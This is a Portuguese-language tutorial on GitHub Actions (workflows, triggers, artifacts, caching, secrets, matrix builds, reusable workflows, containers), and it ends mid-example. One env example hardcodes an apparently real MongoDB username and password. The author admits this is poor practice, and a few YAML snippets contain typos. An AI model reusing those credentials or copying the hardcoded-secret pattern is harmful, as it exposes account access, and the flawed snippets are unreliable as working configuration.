# Introducao

GitHub Actions são recursos disponibilizados pelo GitHub que possibilitam a automacao de procedimentos em relacao ao
repositório.

Em repositórios públicos, pode ser usado de maneira gratuita, mas para reposiórios privados, apenas uma certa quantia
mensal está disponível de maneira gratuita.

mais detalhes: https://docs.github.com/en/billing/managing-billing-for-github-actions/about-billing-for-github-actions

Em GitHub Actions temos 3 blocos principais:

- Workflows
- Jobs
- Steps

Workflows
São vinculados ao repositório e contém um ou mais Jobs que podem ser iniciados através de eventos

Jobs
define o executador (ambiente de execucao), contém um ou mais steps. Pode ser executados em série ou em paralelo,
podendo conter lógicas de condicionais.

Steps
executa um terminal shell script ou uma Action. Pode ser criada ou usar Steps de terceiros (já criados). São executados
em ordem e também podem conter lógicas de condicionais.

# Criando um Workflow

Para criar um do zero, o GitHub utiliza arquivos no formato .yml, dentro da pasta .github>workflows

## Exemplo de um Workflow simples

(.github>workflows>first-action.yml)

Workflow simples que executa comandos linux no runner ubuntu-latest

```
# nome do Workflow
name: First Workflow - Hello World
# workflow_dispatch -> inicia manualmente
# https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows
# evento que disparará as jobs
on: workflow_dispatch 
jobs:
  # nome do job, pode ser qualquer coisa, não é uma palavra reservada
  first-job:
    # o Runner é disponibilizado por um serverless do github
    # github actions runners -> https://docs.github.com/pt/actions/using-github-hosted-runners/about-github-hosted-runners
    runs-on: ubuntu-latest
    steps:
      - name: Print greeting
        run: echo "Hello World"
      - name: Print goodbye
        run: echo "Done - bye!"

```

No exemplo acima, podemos ver na prática o que seria um Workflow com um Job e dois Steps.

# Eventos (disparadores de Workflows)

Dentro do objeto ˜on:˜ é escolhido o evento que será o disparador do Workflow. Segue abaixo exemplo de eventos que pode
ser usado.

Repositório:

- push
- pull_request
- create (a branch ou tab foi criada)
- fork (repositorio foi forked)
- issues (issue foi criada)
- issue_comment (comentario na issue ou pr foi criado)
- watch (repositorio foi starred)
  etc

Outros:

- workflow_dispatch (ativada manualmente)
- repository_dispatch (REST API request ativa a workflow)
- schedule (agendar o workflow)
- workflow_call (ativada através de outras workflows)

mais detalhes: https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows

# Action

O que são Actions?
Uma Action é uma aplicacao que performa uma automacao frequentemente utilizada. Pode ser criada por conta própria ou
utilizada por fontes oficiais de terceiros.

No GitHub temos uma aba de Marktplace onde pode ser encontradas várias Actions criadas por fontes oficiais. Isso
facilita a criacao de Workflows, já que não é necessário recriar processos já criados pelo próprio time do GitHub.

## Action na prática

(.github>workflows>second-action-react-test.yml)

O Workflow abaixo é utilizado para rodar os testes da aplicacao encontrada no diretório second-action-react-demo

É um exemplo de utilizacao do dia-a-dia. Podemos criar um Workflow que valida se nenhum teste quebrou antes de enviar a
atualizacao para producao ou até mesmo homologacao.

Pode ser notado o uso de Actions a partir do comando "uses", que indica o nome de uma Action encontrada no Marketplace

```
name: Second Workflow - Test React Demo
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # primeiro é necessário baixar o nosso código do repositório
      # no serverless do github, onde o runner é executado
      - name: Get code
        # invés de utilizar runs-on e passar os comandos, também é possível
        # utilizar actions já prontas que podem ser encontradas no marketplace
        # do github, por exemplo -> https://github.com/marketplace/actions/checkout
        uses: actions/checkout@v3
        #Também é possível encontrar os programas pré-instalados no runner
        # https://docs.github.com/pt/actions/using-github-hosted-runners/about-github-hosted-runners
        # >
        # https://github.com/actions/runner-images/blob/main/images/linux/Ubuntu2204-Readme.md
        # já tem Node instalado, mas também seria possível utilizar uma action do marketplace
      - name: Install NodeJS
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      - name: Install dependencies
        working-directory: ./second-action-react-demo
        run: npm ci
      - name: Run tests
        working-directory: ./second-action-react-demo
        run: npm test
```

# Rodando Jobs em paralelo

Para rodar os Jobs em paralelo é bem simples, basta apenas adicionar mais um objeto dentro de 'jobs'

Segue exemplo abaixo:

```
name: Third Workflow - Test and Deploy (parallel) React Demo
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # primeiro é necessário baixar o nosso código do repositório
      # no serverless do github, onde o runner é executado
      - name: Get code
        # invés de utilizar runs-on e passar os comandos, também é possível
        # utilizar actions já prontas que podem ser encontradas no marketplace
        # do github, por exemplo -> https://github.com/marketplace/actions/checkout
        uses: actions/checkout@v3
        #Também é possível encontrar os programas pré-instalados no runner
        # https://docs.github.com/pt/actions/using-github-hosted-runners/about-github-hosted-runners
        # >
        # https://github.com/actions/runner-images/blob/main/images/linux/Ubuntu2204-Readme.md
        # já tem Node instalado, mas também seria possível utilizar uma action do marketplace
      - name: Install NodeJS
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      - name: Install dependencies
        working-directory: ./second-action-react-demo
        run: npm ci
      - name: Run tests
        working-directory: ./second-action-react-demo
        run: npm test
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Get code
        uses: actions/checkout@v3
      - name: Install NodeJS
        uses: actions/setup-node@v3
        with:
          node-version: 18
      - name: Install dependencies
        working-directory: ./second-action-react-demo
        run: npm ci
      - name: Build project
        working-directory: ./second-action-react-demo
        run: npm run build
      - name: Deploy
        run: echo ˜Deploying ...˜
```

# Rodando Jobs em série

Para rodar uma Job em sequencia de uma outra Job é bem simples, basta apenas adicionar o atributo "needs" nas
propriedades da Job e setar o identificador da Job que deseja executar anterior a que está sendo configurada

```
name: Forth Workflow - Test and Deploy (sequence) React Demo
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # primeiro é necessário baixar o nosso código do repositório
      # no serverless do github, onde o runner é executado
      - name: Get code
        # invés de utilizar runs-on e passar os comandos, também é possível
        # utilizar actions já prontas que podem ser encontradas no marketplace
        # do github, por exemplo -> https://github.com/marketplace/actions/checkout
        uses: actions/checkout@v3
        #Também é possível encontrar os programas pré-instalados no runner
        # https://docs.github.com/pt/actions/using-github-hosted-runners/about-github-hosted-runners
        # >
        # https://github.com/actions/runner-images/blob/main/images/linux/Ubuntu2204-Readme.md
        # já tem Node instalado, mas também seria possível utilizar uma action do marketplace
      - name: Install NodeJS
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      - name: Install dependencies
        working-directory: ./second-action-react-demo
        run: npm ci
      - name: Run tests
        working-directory: ./second-action-react-demo
        run: npm test
  deploy:
    # adiciona o atributo needs com o identificados do Job que seria o executado anterior a esse
    needs: test
    runs-on: ubuntu-latest
    steps:
      - name: Get code
        uses: actions/checkout@v3
      - name: Install NodeJS
        uses: actions/setup-node@v3
        with:
          node-version: 18
      - name: Install dependencies
        working-directory: ./second-action-react-demo
        run: npm ci
      - name: Build project
        working-directory: ./second-action-react-demo
        run: npm run build
      - name: Deploy
        run: echo ˜Deploying ...˜
```

# Multiplos eventos

Também é possível definir mais de um evento que servem de gatilho para execucao do Workflow. Para isso, é necessário
apenas adicionar colchetes e separar os eventos por vírgula.
Exemplo:

```
on: [push, workflow_dispatch]
```

# Controle de eventos

Vamos supor que não é desejavel executar algum Workflow específico na branch develop, e queremos que o evento seja
disparado apenas para a branch principal, main

Para isso vamos entender dois novos conceitos: Activity Types e Filters

### Activity Types

Cada evento possui tipos de atividades, por exemplo:
pull_request -> opened, closed, edited etc

```
name:
on:
  # setando tipos no evento de pull request
  pull_request:
    types:
      - opened
      - closed
      - edited
  # adicionando um novo evento, mas com tipos padrões
  workflow_dispatch:
jobs:
  ...

```

Pode ser percebido que temos a oportunidade de controlar melhor nossos Workflows

Obs: cada evento tem activity types default caso nenhuma seja especificada

Mais detalhes: https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows

### Forked pull_requests

Quando um repositório é forked, caso as atividades padrões tenha sido setadas para o evento de pull_request, no
repositório original o Workflow vai estar escutando o evento, porém uma aprovacao será necessária. Então é necessário
ter cuidado com esse possível cenário.

### Filters

Podemos configurar a branch target que o evento será escutado.

Por padrão, os Workflows vão ser executados na branch principal.
Para especificar a branch, é necessário apenas adicionar o atributo "branches" dentro do objeto evento.

Segue exemplo abaixo:

```
name:
on:
  push:
    branches:
      - main
      - dev-* # dev-exemplo
      - feat/** # feat/ajuste-botao-home
      - feature/** # feature/ajuste-contrato
jobs:
  ...

```

Também é possível filtrar por path files
Segue exemplo abaixo:

```
name:
on:
  push:
    branches:
      - main
      - dev-* # dev-exemplo
      - feat/** # feat/ajuste-botao-home
      - feature/** # feature/ajuste-contrato
    # ignora evento quando a alteracao foi nos seguintes arquivos
    paths-ignore:
      - '.github/workflows/*'
    # vai ser ativado apenas se algum desses arquivos forem alterados
    paths:
      - 'src/main/**'
jobs:
  ...

```

# Skip Workflows

Caso a ultima mudanca que ocorreu no código foi irrelevante para o funcionamento da aplicacao, como por exemplo, um
comentário, é possível subir as alteracoes sem disparar o fluxo de Workflows

Exemplo: git commit -m "docs: ajuste no readme [skip ci]"

o [skip ci] faz com que os Workflows não sejam disparados.

Mais detalhes: https://docs.github.com/en/actions/managing-workflow-runs/skipping-workflow-runs

# Artefatos

Ao executar um Workflow é possível obter um artefato gerado durante a execucao de um job de Build. Para isso o GitHub
Actions possui duas Actions para facilitar a implementacao do Workflow com essa funcionalidade

### Upload Artefato

O primeiro passo seria fazer upload do artefato gerado.

Primeiro é necessário entender como um artefato é gerado após o comando build. Nesse caso foi criada uma pasta com o
nome dist com os artefatos dentro.

Segue exemplo abaixo

```
    build:
        name: Build
        needs: test
        runs-on: ubuntu-latest
        steps:
          - name: Get code
            uses: actions/checkout@v3
          - name: Install dependencies
            working-directory: ./first-exercise
            run: npm ci
          - name: Build application
            working-directory: ./first-exercise
            run: npm run build
            # busca nome do arquivo JS na pasta dist
          - name: Upload artifact
            uses: actions/upload-artifact@v3
            with:
              name: dist-files
              path: ./first-exercise/dist
```

Para fazer o upload do artefato, foi implementado o step com o nome "Upload artifact" que usa uma Action pré pronta do
Marketplace. Foi necessário apenas usar o objeto with com os atributos indicando o nome do artefato que será feito o
upload e o path dele do repositório.

### Download Artefato

Para fazer download de um artefato é necessário ter feito o Upload antes (exemplo no tópico acima)

```
    deploy:
        name: Deploy
        needs: build
        runs-on: ubuntu-latest
        steps:
          # baixar artefato gerado no passo anterior
          - name: Get build artifacts
            uses: actions/download-artifact@v3
            with:
              name: dist-files
          - name: Output contents
            run: ls

```

Para realizar o download foi implementado o step com nome "Get build artifacts" que usa uma Action pré pronta do
Marketplace. Foi necessário apenas usar o objeto with com o atributo name indicando o nome do artefato que foi feito o
upload (nome de acordo com o tópico anterior)

# Gerando um Output

Um output pode ser utilizado em Jobs seguintes como parametro ou qualquer que seja o caso de uso.
Para gerar um output em um Job é necessário utilizar o objeto outputs dentro do escopo do Job.

Segue exemplo:

```
    build:
        name: Build
        needs: test
        runs-on: ubuntu-latest
        outputs:
          script-file: ${{ steps.publish.outputs.script-file }}
        steps:
        ...
        - name: Publish JS filename
          id: publish
          run: find ./first-exercise/dist/assets/*.js -type f -execdir echo 'script-file={}' >> $GITHUB_OUTPUT ';'
```

pode ser percebido que para acessar o texto que foi gerado como output, foi necessário
utilizar o caminho do texto pelo id que foi escolhido no step

id: publish

em run foi descrito um script que escreve o nome do arquivo .js no contexto do $GITHUB_OUTPUT

Para utilizar o output basta acessar utilizando o objeto needs e utilizando o caminho onde foi setado o objeto outputs

Segue exemplo:

```
          - name: Output filename
          # usando o objeto needs acessa o job que esse job depende (para output é a melhor opcao) e acessa o atributo script-file para acessar o filename
            run: echo "${{ needs.build.outputs.script-file }}"
```

# Utilizando Cache em Steps que se repetem

Para utilizar o recurso de cache, o GitHub já tem uma Action criada:
actions/cache@v3

É necessário criar o cache antes do recurso que será "cacheado" no exemplo abaixo foi criado um cache da pasta /.npm,
que é criada através do comando "npm ci" no step seguinte.

O cache é aplicado entre os Workflows/ Jobs e Steps. Para usá-lo é necessário o uso da Action.

Para manter o cache, é criado um hash do arquivo package-lock.json. Caso o arquivo mude
o hash também mudará, e se o hash mudar, um novo cache será criado.

O comando "npm ci" também possui um recurso de cache, onde as dependências são baixadas apenas
se a pasta /.npm não existir.

```
name: First Exercise - Output e Artefatos
on: push
jobs:
    lint:
        name: Lint
        runs-on: ubuntu-latest
        steps:
          - name: Get code
            uses: actions/checkout@v3
          - name: Cache dependencies
            uses: actions/cache@v3
            with:
              # se já existe a pasta .npm, ele verifica o hash do arquivo package-lock.json, se for o mesmo hash, utilizado cache
              # caso contrário, gera outro
              # https://github.com/actions/cache
              path: ˜/.npm 
              # hashFiles produz um hash para os arquivos, facilitando a identificacao caso haja alguma mudanca para atualizar o cache
              key: deps-node-modules-${{ hashFiles('**/package-lock.json') }}
          # Caso haja a pasta .npm, o comando npm ci não vai baixar novamente
          # o cache é usado para a pasta .npm permanecer caso nao haja mudancas no arquivo package-lock.json
          - name: Install dependencies
            working-directory: ./first-exercise
            run: npm ci
```

A lógica do cache será em cima da pasta /.npm, então caso seja necessário utilizar o cache em outros Jobs, será
necessário utilizar o step
onde é usado a Action de cache.

Segue exemplo abaixo, onde o cache é utilizando no job "lint", "test" e "build":

```
name: First Exercise - Output e Artefatos
on: push
jobs:
    lint:
        name: Lint
        runs-on: ubuntu-latest
        steps:
          - name: Get code
            uses: actions/checkout@v3
          - name: Cache dependencies
            uses: actions/cache@v3
            with:
              # se já existe a pasta .npm, ele verifica o hash do arquivo package-lock.json, se for o mesmo hash, utilizado cache
              # caso contrário, gera outro
              # https://github.com/actions/cache
              path: ˜/.npm 
              # hashFiles produz um hash para os arquivos, facilitando a identificacao caso haja alguma mudanca para atualizar o cache
              key: deps-node-modules-${{ hashFiles('**/package-lock.json') }}
          # Caso haja a pasta .npm, o comando npm ci não vai baixar novamente
          # o cache é usado para a pasta .npm permanecer caso nao haja mudancas no arquivo package-lock.json
          - name: Install dependencies
            working-directory: ./first-exercise
            run: npm ci
          - name: Lint
            working-directory: ./first-exercise
            run: npm run lint
    test:
        name: Test
        needs: lint
        runs-on: ubuntu-latest
        steps:
          - name: Get code
            uses: actions/checkout@v3
          - name: Cache dependencies
            uses: actions/cache@v3
            with:
              path: ˜/.npm 
              # hashFiles produz um hash para os arquivos, facilitando a identificacao caso haja alguma mudanca para atualizar o cache
              key: deps-node-modules-${{ hashFiles('**/package-lock.json') }}
          - name: Install dependencies
            working-directory: ./first-exercise
            run: npm ci
          - name: Test
            working-directory: ./first-exercise
            run: npm run test
    build:
        name: Build
        needs: test
        runs-on: ubuntu-latest
        outputs:
          script-file: ${{ steps.publish.outputs.script-file }}
        steps:
          - name: Get code
            uses: actions/checkout@v3
          - name: Cache dependencies
            uses: actions/cache@v3
            with:
              path: ˜/.npm 
              # hashFiles produz um hash para os arquivos, facilitando a identificacao caso haja alguma mudanca para atualizar o cache
              key: deps-node-modules-${{ hashFiles('**/package-lock.json') }}
          - name: Install dependencies
            working-directory: ./first-exercise
            run: npm ci
          - name: Build application
            working-directory: ./first-exercise
            run: npm run build
            # busca nome do arquivo JS na pasta dist
          - name: Publish JS filename
            id: publish
            run: find ./first-exercise/dist/assets/*.js -type f -execdir echo 'script-file={}' >> $GITHUB_OUTPUT ';'
          - name: Upload artifact
            uses: actions/upload-artifact@v3
            with:
              name: dist-files
              path: ./first-exercise/dist
```

### Invalidando cache

No contexto acima, o cache é invalidado quando o arquivo package-lock.json é modificado.

# Variáveis de ambiente

Utilizar variáveis de ambiente em um sistema é muito comum, ainda mais quando temos mais de um ambiente
como por exemplo: dev, hom e prod.

Variáveis de ambiente são a melhor opção quando é necessário utilizar um não estático.

## env

É possível utilizar variáveis de ambiente direto no escopo do Workflow, Job ou Step (caso a mesma seja criada em um
escopo mais específico, irá sobrescrever a do escopo anterior)

Segue exemplo abaixo - Workflow com variáveis de ambiente no escopo do Workflow e também do Job
escopo do Workflow pode ser resgatada da seguinte maneira -> $MONGODB_USERNAME
escopo do Job pode ser resgatada da seguinte maneira -> ${{ env.MONGODB_USERNAME }}

```
name: Third - Environment Variables
on:
  push:
    branches:
      - main
      - dev
# variáveis default https://docs.github.com/en/actions/learn-github-actions/variables#default-environment-variables
# variáveis que podem ser usadas em todos os jobs -> escopo do Workflow
env:
  # variáveis que são usadas em ./third-environment-variable/data/database.js
  MONGODB_DB_NAME: gha-demo
jobs:
  test:
    # variáveis que podem ser usadas em todos os steps -> escopo do Job
    # essa não é a melhor maneira de armazenar dados sensíveis como password
    # temos a possibilidade de armazenar no próprio GitHub
    # settings > security > secrets > actions
    env:
      MONGODB_CLUSTER_ADDRESS: estudo.srlzzrn.mongodb.net
      MONGODB_USERNAME: inrikys
      MONGODB_PASSWORD: zNnrllTBJfWIcZOB
      PORT: 8080
    environment: testing
    runs-on: ubuntu-latest
    steps:
      - name: Get Code
        uses: actions/checkout@v3
      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: ~/.npm
          key: npm-deps-${{ hashFiles('**/package-lock.json') }}
      - name: Install dependencies
        working-directory: ./third-environment-variables
        run: npm ci
      - name: Run server
        working-directory: ./third-environment-variables
        # a variavel de ambiente em um runner linux pode ser acessa usando $ e o nome da variável
        run: npm start & npx wait-on http://127.0.0.1:$PORT
      - name: Run tests
        working-directory: ./third-environment-variables
        run: npm test
      - name: Output information
        run: |
          echo "MONGODB_USERNAME = ${{ env.MONGODB_USERNAME }}"
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - name: Output information
        # MONGODB_USERNAME está no escopo do Job test
        # MONGODB_DB_NAME está no escopo do Workflow
        run: |
          echo "MONGODB_USERNAME: ${{ env.MONGODB_USERNAME}}"
          echo "MONGODB_DB_NAME: $MONGODB_DB_NAME"

```

## Secrets

Em caso de dados sensíveis, como password e usuário, é possível armazenar
o valor no próprio repositório, em configurações

![Settings do repositório](https://i.imgur.com/hCF7O6J.png)

Na aba Security, no lado esquerdo, clicar em Secrets and variables > Actions

![Secrets and variables](https://i.imgur.com/O2K15bv.png)

Basta apenas clicar em New repository secret, e adicionar a chave e valor
![Adicionar secrets ou variaveis](https://i.imgur.com/sFU0e3r.png)

Para utilizar os secrets criados, segue exemplo abaixo:

é possível acessar através de ${{ secrets.NOME_SECRET }}, porém ao tentar exibir no terminal, o GitHub irá anonimizar
escondendo o valor

```
name: Third - Secrets
on:
  push:
    branches:
      - main
      - dev
env:
  # variáveis que são usadas em ./third-environment-variable/data/database.js
  # https://docs.github.com/pt/actions/security-guides/using-secrets-in-github-actions
  MONGODB_DB_NAME: ${{ secrets.MONGODB_DB_NAME }}
jobs:
  test:
    # settings do repositório > security > secrets > actions
    env:
      MONGODB_CLUSTER_ADDRESS: estudo.srlzzrn.mongodb.net
      MONGODB_USERNAME: ${{ secrets.MONGODB_USERNAME }}
      MONGODB_PASSWORD: ${{ secrets.MONGODB_PASSWORD }}
      PORT: 8080
    environment: testing
    runs-on: ubuntu-latest
    steps:
      - name: Get Code
        uses: actions/checkout@v3
      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: ~/.npm
          key: npm-deps-${{ hashFiles('**/package-lock.json') }}
      - name: Install dependencies
        working-directory: ./third-environment-variables
        run: npm ci
      - name: Run server
        working-directory: ./third-environment-variables
        # a variavel de ambiente em um runner linux pode ser acessa usando $ e o nome da variável
        run: npm start & npx wait-on http://127.0.0.1:$PORT
      - name: Run tests
        working-directory: ./third-environment-variables
        run: npm test
      - name: Output information
        # GitHub deve esconder o valor dos secrets
        run: |
          echo "MONGODB_USERNAME = ${{ secrets.MONGODB_USERNAME }}"
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - name: Output information
        # GitHub deve esconder o valor dos secrets
        run: |
          echo "MONGODB_USERNAME: ${{ env.MONGODB_USERNAME}}"
          echo "MONGODB_DB_NAME: $MONGODB_DB_NAME"
```

## Environment

Caso a aplicação tenha mais de um ambiente, o uso de Environment no repositório do GitHub é a melhor opção.

![Settings do repositório](https://i.imgur.com/hCF7O6J.png)

Clicar em Environments, na aba Code and automation

![Environments](https://i.imgur.com/THEnGlD.png)

Adicionar as Secrets

![Environments Secrets](https://i.imgur.com/I2BYLdC.png)

Também é possível escolher uma branch específica para a utilização das Secrets e variáveis do Environment

![Environment Conditions](https://i.imgur.com/JNV2TQq.png)

# Controlando fluxo de Jobs e Steps

## Condição IF

É possível controlar o fluxo com condição IF em um determinado trecho do script, entre Jobs ou Steps

No exemplo abaixo é utilizado uma condição IF após o comando de rodas os testes ser executado.
O IF utilizado no Step seguinte ao que executa os testes.

Para o IF funcionar corretamente em um contexto de falha, foi necessário acrescentar uma função especial do GitHub
Actions,
a função failure(). Ela verifica se houve alguma falha nos Steps e Jobs anteriores. Caso ela não seja adicionada, quando
um dos Steps ou Jobs anteriores falharem, o Workflow para de rodar, e com a função failure(), dá para escolher
qual Step será executado se algo falhar.

Dentro do IF também usamos o objeto de contexto "steps", para capturar o resultado do Step com id = run-tests.

```
name: Step if condition - Execution flow
on:
  push:
    branches:
      - main
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Get code
        uses: actions/checkout@v3
      - name: Cache dependencies
        id: cache
        uses: actions/cache@v3
        with:
          path: ~/.npm
          key: deps-node-modules-${{ hashFiles('**/package-lock.json') }}
      - name: Install dependencies
        working-directory: ./forth-execution-flow
        run: npm ci
      - name: Test code
        # o uso do id permite que qualquer step seja referenciado
        id: run-tests
        working-directory: ./forth-execution-flow
        run: npm run test
        # Roda apenas se algum teste falhar
      - name: Upload test report
        if: ${{ failure() && steps.run-tests.outcome == 'failure' }}
        uses: actions/upload-artifact@v3
        with:
          name: test-report
          path: ./forth-execution-flow/test.json
```

tem 4 funções especiais
failure(), success(), always(), cancelled()
failure -> retorna true quando qualquer Step ou Job anterior falhar
success -> retorna true quando NENHUM Step ou Job anterior falhar
always -> sempre retorna true, caso sucesso ou falha
cancelled -> retorna true quando o Workflow for cancelado

https://docs.github.com/en/actions/learn-github-actions/expressions

Um outro exemplo de uso para a função failure():
Caso algum Job ou Step falhe, esse Job "report" será executado.

```
  report:
    needs: [primeiro-job-do-workflow, ultimo-job-do-workflow]
    if: failure()
    runs-on: ubuntu-latest
    steps:
      - name: Output failure information
        run: |
          echo "Something went wrong"
          echo "${{ toJson(github) }}"
```

É importante ressaltar que no atributo needs é necessário ter o primeiro e o ultimo job do workflow, para não ser
executado antes
que algum Job ou Step falhe.

Para o Workflow continuar rodando, é necessário adicionar o atributo continue-on-error: true. Caso contrário, quando o
step falhar
o Workflow irá parar

```
      - name: Test code
        # Caso esse Step falhe, o Workflow continua
        # em steps.idDesseStep.conclusion seria success nesse caso
        # caso queria saber se o Step realmente falhou, é usado o outcome invés do conclusion
        continue-on-error: true
        id: run-tests
        working-directory: ./forth-execution-flow
        run: npm run test
      - name: Upload test report
        if: ${{ failure() && steps.run-tests.outcome == 'failure' }}
        uses: actions/upload-artifact@v3
        with:
          name: test-report
          path: ./forth-execution-flow/test.json
```

Caso continue-on-error esteja em true, a conclusão do step seria sucesso
steps.<step_id>.conclusion -> o resultado seria true, pois é a conclusão do step
e a conclusão, por causa do uso do continue-on-error, é de sucesso

steps.run-tests.outcome ->  usando outcome ele pega o resultado antes do continue-on-error, ou seja,
ele pega o resultado correto do step

# Usando estratégia Matrix (configurações multiplas)

Também é possível rodar um Workflow utilizando mais de uma configuração.
Exemplo: Tenho te testar uma aplicação utilizando versão 14 do node e também a 16.

```
name: Matrix Demo
on: push
jobs:
  build:
    # Continuar a executar os jobs caso algum valor da matrix dê algum erro
    continue-on-error: true
    # Caso queiramos configurar o job com diferentes configurações
    strategy:
      # Irá executar várias vezes esse Job, em paralelo, usando configurações setadas aqui dentro do objeto matrix
      matrix:
        node-version: [12, 14, 16]
        operation-system: [ubuntu-latest, windows-latest]
    # Aplica valores setados no contexto da strategy matrix
    runs-on: ${{ matrix.operation-system }}
    steps:
      - name: Get Code
        uses: actions/checkout@v3
      - name: Install NodeJS
        uses: actions/setup-node@v3
        with:
          nome-version: 14
      - name: Install Dependencies
        run: npm ci
      - name: Build project
        run: npm run build
```

Pode ser observado que é utilizado um objeto chamado strategy, e dentro dele matrix.
Em matrix nós criamos variáveis que aceitam array de valores (como se fosse uma matrix mesmo)
e isso faz com que o Workflow seja executado, utilizando todos os valores setados.

Para utilizar dos valores setados, utilizamos o contexto matrix para obter as configurações.

```
    runs-on: ${{ matrix.operation-system }}
```

# Reusando Workflows

Até o momento vimos como reutilizar Actions disponibilizadas no Marketplace, seguindo a documentação de cada uma.
Para reusar um Workflow, não é muito diferente, basta que o evento disparador seja do tipo "workflow_call".

Exemplo de Workflow reutilizável:

```
name: Reusable Deploy
# evento disparado de dentro de outro Workflow
on: workflow_call
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Output information
        run: echo "Deploying & uploading..."
```

Para reutilizar o Workflow usado de exemplo acima, basta seguir a seguinte sintaxe:

```
  deploy:
    uses: ./.github/workflows/11-reusable-workflow-execution-flow.yml
```
É bem simples, é só utilizar o atributo uses (assim como fazemos quando vamos reutilizar uma Action) e 
refereciar seu path.

### Adicionando inputs a uma Workflow reusável
Assim como as actions, os workflows reusáveis também aceitam parametros utilizando o objeto "with"

Para isso, abaixo do evento workflow_call, basta apenas inserir  os inputs/parametros que se deseja receber ao utilizar o Workflow

No exemplo abaixo, foi configurado o parametro "artifact-name", podendo também ser configurado valor padrão,
se é obrigatório, tipo e descrição.

```
name: Reusable Deploy With Input
on:
  # Adicionando inputs à chamada desse workflow
  workflow_call:
    inputs:
      artifact-name:
        description: The name of the deployable artifact files
        required: false
        # caso não seja obrigatório, dá para setar um valor padrão
        default: dist
        type: string
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Get Code
        uses: actions/download-artifact@v3
        with:
          name: ${{ inputs.artifact-name }}
      - name: List files
        run: ls
      - name: Output information
        run: echo "Deploying & uploading..."
```

Exemplo de uso do Workflow acima 

```
  deploy:
    needs: build
    uses: ./.github/workflows/11-reusable-input-workflow-execution-flow.yml
    with:
      artifact-name: dist-files
```


### Secrets em Workflow reusável

Também é possível passar secrets do GitHub. O objeto secrets fica no mesmo nível que inputs

```
name: Reusable Deploy With Secret Input
on:
  # Adicionando inputs à chamada desse workflow
  workflow_call:
    inputs:
      artifact-name:
        description: The name of the deployable artifact files
        required: false
        # caso não seja obrigatório, dá para setar um valor padrão
        default: dist
        type: string
    secrets:
      some-secret:
        required: false
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Get Code
        uses: actions/download-artifact@v3
        with:
          name: ${{ inputs.artifact-name }}
      - name: List files
        run: ls
      - name: Output information
        run: echo "Deploying & uploading..."
```

Para passar os Secrets como parametro:

```
    deploy:
    needs: build
    uses: ./.github/workflows/11-reusable-input-workflow-execution-flow.yml
    with:
      artifact-name: dist-files
      ## Aqui passamos os secrets (lembrando que deve ser cadastrado no github
#    secrets:
#      some-secret: ${{ secrets.some-secret }}
```


### Outputs em Workflow reusável
Em um Workflow reusável, também é possível capturar outputs

Para declarar outputs em um Workflow, basta seguir o seguinte exemplo:

Deve ser declarado no escopo do evento e também no escopo da Job

quando o step com o id set-result é executado, ele escreve success dentro da variavel step-result, que é armazenada no contexto
do $GITHUB_OUTPUT, como o output está declarado no contexto do Job e escutando a variável step-result, vai ser esse valor que será
emitido, mas será emitido dentro da variável result, que é encontrado em output de escopo mais externo.

```
name: Reusable Deploy With Secret Input
on:
  # Adicionando outputs
  workflow_call:
    outputs:
      result:
        description: The result of the deployment operation
        value: ${{ jobs.deploy.outputs.outcome }}
jobs:
  deploy:
    outputs:
      outcome: ${{ steps.set-result.outputs.step-result }}
    runs-on: ubuntu-latest
    steps:
      - name: Get Code
        uses: actions/download-artifact@v3
        with:
          name: ${{ inputs.artifact-name }}
      - name: List files
        run: ls
      - name: Output information
        run: echo "Deploying & uploading..."
      - name: Set result output
        id: set-result
        run: echo "step-result=success" >> $GITHUB_OUTPUT

```


Para utilizar os outputs fora da Workflow, basta após o uso do Workflow acessar o contexto onde ele foi utilizado e
acessar o objeto de output. Exemplo:
No Job deploy é utilizado o Workflow e no Job seguinte é acessado o output dele

```
  deploy:
    needs: build
    uses: ./.github/workflows/11-reusable-output-workflow-execution-flow.yml
  print-deploy-result:
    needs: deploy
    runs-on: ubuntu-latest
    steps:
      - name: Print deploy output
        ## result é o nome do output setado no workflow reusável
        run: echo "${{ needs.deploy.outputs.result }}"
```


# Usando Docker Containers
Usado quando é necessário ter controle completo do ambiente que a aplicação será executada

O exemplo a seguir ilustra como é utilizado um container com imagem node.
A imagem pode ser obtida através de um docker registry como o Docker Hub (https://hub.docker.com/_/node)


```
  name: Deployment (Container)
on:
  push:
    branches:
      - main
      - dev
env:
  CACHE_KEY: node-deps
  MONGODB_DB_NAME: ${{ secrets.MONGODB_DB_NAME }}
jobs:
  test:
    environment: testing
    runs-on: ubuntu-latest
    # https://hub.docker.com/_/node
    container:
      image: node:16
    env:
      MONGODB_CONNECTION_PROTOCOL: mongodb+srv
      MONGODB_CLUSTER_ADDRESS: cluster0.ntrwp.mongodb.net
      MONGODB_USERNAME: ${{ secrets.MONGODB_USERNAME }}
      MONGODB_PASSWORD: ${{ secrets.MONGODB_PASSWORD }}
      PORT: 8080
    steps:
      - name: Get Code
        uses: actions/checkout@v3
      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: ~/.npm
          key: ${{ env.CACHE_KEY }}-${{ hashFiles('**/package-lock.json') }}
      - name: Install dependencies
        working-directory: ./docker-examples-app
        run: npm ci
      - name: Run server
        working-directory: ./docker-examples-app
        run: npm start & npx wait-on http://127.0.0.1:$PORT # requires MongoDB Atlas to accept requests from anywhere!
      - name: Run tests
        working-directory: ./docker-examples-app
        run: npm test
      - name: Output information
        run: |
          echo "MONGODB_USERNAME: $MONGODB_USERNAME"
  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - name: Output information
        env:
          PORT: 3000
        run: |        
